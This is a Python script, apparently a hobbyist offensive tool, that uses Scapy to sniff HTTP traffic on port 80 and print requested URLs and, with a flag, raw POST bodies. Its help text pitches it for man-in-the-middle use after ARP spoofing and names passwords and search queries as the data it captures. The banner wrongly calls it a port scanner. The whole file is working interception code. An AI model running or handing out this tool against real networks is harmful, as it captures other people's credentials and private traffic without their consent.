#python3 http_sniffer.py -i wlan0 --show-raw
from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
from colorama import init, Fore
import sys, random

# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

def ClownLogo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """

              __  __________________     _____       _ ________         
             / / / /_  __/_  __/ __ \   / ___/____  (_) __/ __/__  _____
            / /_/ / / /   / / / /_/ /   \__ \/ __ \/ / /_/ /_/ _ \/ ___/
           / __  / / /   / / / ____/   ___/ / / / / / __/ __/  __/ /    
          /_/ /_/ /_/   /_/ /_/       /____/_/ /_/_/_/ /_/  \___/_/     
                                                              
     Nota! : Scanning Port es un escaner 100% funcional, verifique con nmap.       
    """
    for N, line in enumerate(x.split("\n")):
         sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
         time.sleep(0.05)

def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")


if __name__ == "__main__":
    import argparse
    ClownLogo()
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)